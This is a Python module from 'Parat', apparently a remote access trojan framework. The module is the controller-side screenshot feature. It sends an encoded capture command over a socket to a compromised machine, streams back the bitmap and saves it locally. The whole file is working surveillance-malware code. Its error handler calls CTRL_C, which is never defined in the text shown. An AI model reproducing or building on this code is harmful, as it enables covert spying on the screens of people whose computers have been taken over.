#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

import socket
from time import sleep
from os import system
from random import choice
from string import ascii_letters
from lib.ParatPrint import colorize, pprint
from lib.ProcessThread import ParatProcessBar
from core.Handler import tumultuous
from lib.ParatEncrypt import Encode, Decode
from lib.MiniUtils import rand_str



class ParatScreenshot:

    def __init__(self, conn, colors):

        self.handler = "#DATA_HANDLER"
        self.conn    = conn
        self.colors  = colors


    def prepare_basics(self):

        self.conn.send(Encode(">screensh0t<"))
        text = colorize(
            "capturing",
            colored=self.colors,
            status="INF"
        )
        self.process_bar = ParatProcessBar(text)
        self.process_bar.start_process()

        self.filename = "scr_" + rand_str(5)
        self.filename += ".bmp"
        self.screenshot_file = open(self.filename, 'wb')


    def start(self):

        try:
            recived_data = self.conn.recv(4096)

            while recived_data:
                self.screenshot_file.write(recived_data); sleep(0.1)
                recived_data = self.conn.recv(4096)

                if self.handler in recived_data:
                    self.screenshot_file.write(
                        recived_data.replace(self.handler, "")
                    ); break

            self.screenshot_file.close()

            self.process_bar.Stop = True; sleep(0.2)
            pprint(
                colorize(
                    "Captured: %s\n" % self.filename,
                    colored=self.colors,
                    status="SUC"
                ))
            # system('feh ' + self.filename)

        except socket.error:

            self.process_bar.Stop = True; sleep(0.2)
            CTRL_C(
                self.conn,
                self.handler,
                self.colors,
                self.filename.replace(".bmp", "")
            )
